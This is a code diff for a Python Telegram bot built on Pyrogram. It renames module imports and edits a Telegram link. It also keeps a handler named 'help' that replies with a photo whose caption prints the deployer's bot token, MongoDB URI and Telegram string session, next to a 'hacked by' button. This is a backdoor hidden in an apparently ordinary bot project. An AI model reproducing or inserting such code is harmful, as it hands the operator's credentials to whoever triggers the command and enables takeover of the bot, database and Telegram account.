@@ -13,12 +13,12 @@ from pyrogram import filters
 
 load_dotenv()
 
-from RUDRA import app
-from RUDRA.core.call import Rudra
-from RUDRA.misc import db
-from RUDRA.utils.database import get_assistant, get_authuser_names, get_cmode
-from RUDRA.utils.decorators import ActualAdminCB, AdminActual, language
-from RUDRA.utils.formatters import alpha_to_int, get_readable_time
+from Rudra import app
+from Rudra.core.call import Rudra
+from Rudra.misc import db
+from Rudra.utils.database import get_assistant, get_authuser_names, get_cmode
+from Rudra.utils.decorators import ActualAdminCB, AdminActual, language
+from Rudra.utils.formatters import alpha_to_int, get_readable_time
 from config import BANNED_USERS, adminlist, lyrical
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
@@ -108,12 +108,12 @@ async def restartbot(client, message: Message, _):
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/RUDRA_JAAT_1)............☆""",
+       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/Rudra_JAAT_1)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/RUDRA_JAAT_1")
+                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/Rudra_JAAT_1")
                  ]
             ]
          ),
